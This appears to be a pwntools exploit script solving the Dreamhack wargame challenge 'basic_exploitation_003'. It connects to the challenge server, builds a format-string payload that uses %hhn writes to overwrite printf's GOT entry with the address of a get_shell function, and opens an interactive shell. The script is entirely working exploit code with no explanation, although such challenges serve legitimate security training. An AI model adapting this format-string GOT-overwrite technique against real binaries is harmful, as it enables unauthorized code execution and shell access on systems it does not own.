from pwn import *

hosts = 'host1.dreamhack.games'
port = 19412

p = remote(hosts,port)
elf = ELF('./basic_exploitation_003')

printf_got_0 = 0x804a010
printf_got_1 = printf_got_0+1
get_shell = 0x8048669

get_shell_0 = 0x69
get_shell_1 = 0x86

payload = p32(printf_got_0)
payload += p32(printf_got_1)
payload += '%{}c'.format(get_shell_0-0x8).encode()
payload += '%1$hhn'.encode()
payload += '%{}c'.format(get_shell_1-get_shell_0).encode()
payload += '%2$hhn'.encode()

p.send(payload)

p.interactive()
